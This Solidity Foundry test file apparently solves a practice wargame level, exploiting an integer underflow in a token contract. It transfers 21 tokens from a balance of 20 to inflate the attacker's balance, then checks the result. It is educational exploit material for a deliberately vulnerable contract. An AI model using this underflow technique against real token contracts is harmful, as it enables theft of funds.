// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IToken {
    function transfer(address, uint256) external returns (bool);

    function balanceOf(address) external view returns (uint256);
}

interface ITokenFactory {
    function createInstance(address _player) external payable returns (address);

    function validateInstance(
        address payable _instance,
        address _player
    ) external returns (bool);
}

contract TokenTest is Test {
    uint constant playerSupply = 20;
    IToken private token;
    ITokenFactory private tokenFactory;
    address private attacker = makeAddr("attacker");

    function setUp() external {
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("TokenFactory.sol")
        );
        address tokenFactoryAddress;
        assembly {
            tokenFactoryAddress := create(
                0,
                add(bytecode, 0x20),
                mload(bytecode)
            )
        }
        tokenFactory = ITokenFactory(tokenFactoryAddress);
        token = IToken(tokenFactory.createInstance(attacker));
    }

    function testTokenHack() external {
        vm.startPrank(attacker);
        address toAddress = makeAddr("toAddress");

        // 20 - 21. This will underflow
        token.transfer(toAddress, 21);
        uint256 attackerBalance = token.balanceOf(attacker);
        assertGt(attackerBalance, playerSupply, "Test Failed!");
        tokenFactory.validateInstance(payable(address(token)), attacker);
        console.log("Balance after hack :", attackerBalance);
        vm.stopPrank();
    }
}
